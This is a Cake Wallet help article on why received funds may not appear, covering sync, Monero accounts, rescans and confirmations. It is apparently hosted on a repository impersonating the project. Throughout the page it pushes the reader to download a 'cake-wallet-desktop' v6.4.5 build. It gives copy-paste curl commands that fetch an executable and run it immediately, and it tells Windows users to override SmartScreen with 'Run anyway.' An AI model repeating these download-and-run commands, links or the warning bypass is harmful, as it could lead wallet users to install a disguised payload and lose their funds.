![Cake Wallet funds not appearing guide](assets/cake-wallet-funds-not-appearing-article-banner.png)

# Cake Wallet Funds Not Appearing: What to Check

Six checks in order, from sync to the right account to a rescan.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

A missing balance is usually a wallet that has not finished syncing, a transaction with too few confirmations, or the wrong wallet or Monero account open. Work through sync, confirmations, wallet and account, then rescan. Only after those four does a transfer prove anything about the sender.

<!-- ARTICLE-BODY-BEGIN -->

## Get onto the current build
Start by installing the current build over the one you have, keeping the wallet. A build that is behind can show stale balances and fail to read newer chain data, and the fix costs nothing compared with the hours spent checking a transaction that was never the problem.

Download it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and let the wallet open fully before judging the balance. If the number changes while the app syncs, you were watching a sync problem, not a missing payment.

## Is the wallet synced
The app shows its sync state: an empty area at the top means synced, a block count means it is still reading the chain. A restored Monero wallet can take a long while, and the balance stays at zero until the scan reaches the block that contains your funds.

Do not close the app and reopen it repeatedly while it syncs; that restarts the work. If the count does not move at all for a long stretch, the connection is the next thing to check rather than the transaction.

## Is it the wrong account
Monero wallets hold accounts, and an account holds subaddresses. A deposit sent to a subaddress of account two does not appear when account one is open, even though the wallet holds it. Switch accounts before you conclude anything.

The same shape exists with multiple wallets, where a second wallet has its own phrase and its own balance. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-monero-accounts-subaddresses.md">Monero accounts and subaddresses</a> explains the three levels, which is the piece most restore guides skip.

## Monero needs a rescan
If the sync completes and a known transaction is still absent, a rescan re-reads the chain from the restore height. It is the right tool when history is wrong or partial, and it is expensive: on Monero it can run for a long time.

Use it after the cheaper checks, not instead of them. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md">Rescan the Monero blockchain in Cake Wallet</a> covers what a rescan can and cannot recover, and why a wrong restore height makes it slow.

## Fees and confirmations
A transaction with no or few confirmations is not spendable yet, and part of a received balance stays locked while it confirms. Monero takes roughly ten blocks, about twenty minutes in normal conditions; Bitcoin needs a few confirmations.

A stuck send is a fee problem rather than a balance problem. <a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md">Cake Wallet network fee settings</a> explains why a low fee delays confirmation instead of losing the transaction, and what cannot be undone once it confirms.

## When it is the sender
If the sync is complete, the account is right, confirmations have passed and a rescan finds nothing, the next check is the sending side: was the withdrawal actually broadcast, to the address you gave, on the network you expected. An exchange that marks a withdrawal complete before broadcasting is the usual culprit.

Keep the transaction ID; it is the only thing that settles the question. A missing deposit is not recoverable by Cake Wallet, which cannot freeze, reverse or reissue a transfer.

## Quick triage
| Symptom | Cause | Fix |
| --- | --- | --- |
| Balance zero after a send | The wallet is still syncing, or another account is open | Finish the sync, then switch accounts |
| Funds arrived but a payment is missing | It has not confirmed, or it went to another address | Check the transaction ID on an explorer |
| Nothing changes after an update | The build is behind the data it reads | Download and run the current release |

When the build is the cause, <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">download and run the current release</a> and re-check the same address before treating anything as lost.

## FAQ
### Why is my balance zero?
Most often an unfinished sync, a different account being open, or a deposit that has not confirmed yet.
### How many confirmations are needed?
Monero needs about ten blocks, roughly twenty minutes; Bitcoin a few confirmations. Until then the funds show as pending.
### Why is my balance lower than expected?
Part of a Monero balance stays locked while it confirms, and a fee is deducted from what you send.
### Why did my Monero balance vanish after an update?
The update usually triggers a resync. Let it finish before drawing conclusions.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cake Wallet Monero sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [rescan the Monero blockchain in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-rescan.md) · [Cake Wallet network fee settings](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-network-fee.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
